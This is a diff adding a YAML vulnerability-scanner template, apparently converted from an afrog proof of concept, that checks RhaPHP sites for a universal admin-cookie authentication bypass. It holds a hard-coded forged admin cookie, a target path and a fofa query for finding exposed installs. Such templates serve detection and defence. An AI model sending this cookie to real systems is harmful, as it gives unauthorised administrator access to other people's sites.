@@ -1,0 +1,34 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - headers:
+      Cookie: think_admin=think%3A%7B%22id%22%3A%221%22%2C%22admin_name%22%3A%22admin%22%2C%22password%22%3A%22c77c2771505679b013eac4a6dbb3c6c7%22%2C%22status%22%3A%221%22%2C%22ip%22%3A%22127.0.0.1%22%2C%22last_time%22%3A%221664263362%22%2C%22rand_str%22%3A%22spDjRC%22%2C%22admin_id%22%3A%221%22%7D;PHPSESSID=598c2a7c00f8b59fe4d35d802166e2ed
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 自动回复
+        condition: and
+      - type: word
+        part: body
+        words:
+          - RhaPHP
+        case-insensitive: true
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/mp/mp'
+id: rhaphp-universal-cookie
+info:
+  author: lsqm
+  description: 'fofa: app="RhaPHP系统安装"'
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: RHaphp universal cookie
+  severity: high
+  tags: rhaphp,cookie,argus-import
